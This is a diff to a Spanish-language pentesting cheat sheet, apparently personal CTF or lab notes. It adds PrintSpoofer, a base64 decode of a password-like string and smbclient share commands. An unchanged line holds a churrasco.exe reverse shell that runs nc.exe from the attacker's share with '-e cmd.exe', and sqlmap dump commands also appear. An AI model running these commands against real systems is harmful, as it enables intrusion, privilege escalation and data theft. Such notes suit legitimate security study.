@@ -50,6 +50,8 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
 pasar el archivo nc.exe a windows
 reverseshell: churrasco.exe "\\<ip atacante>\recurso\nc.exe <ip atacante> <puerto> -e cmd.exe"
 
+printspoofer
+
 saber permisos icacls (directorio archivo)
 otorgar permisos icacls "ruta\al\archivo" /grant NombreDeUsuario:F
 
@@ -81,6 +83,9 @@ curl -s -X GET "url"
 
 #### de hexadecimal a normal ####
 | xxd -ps -r; echo
+
+##### de base 64 a normal #####
+echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
 
 
 #### convertir protegido por contraseña a hash ####
@@ -159,3 +164,10 @@ sqlmap -r request.txt --dbms=mysql --dump
 sc queryex | find /i "SERVICE_NAME:"
 binarios corriendo
 ps
+
+
+################## listar smb #############
+smbclient -L ip            ver recursos compartidos
+smbclient  //ip/recurso
+get archivo        descargar archivo
+put archiv         subir archivo 
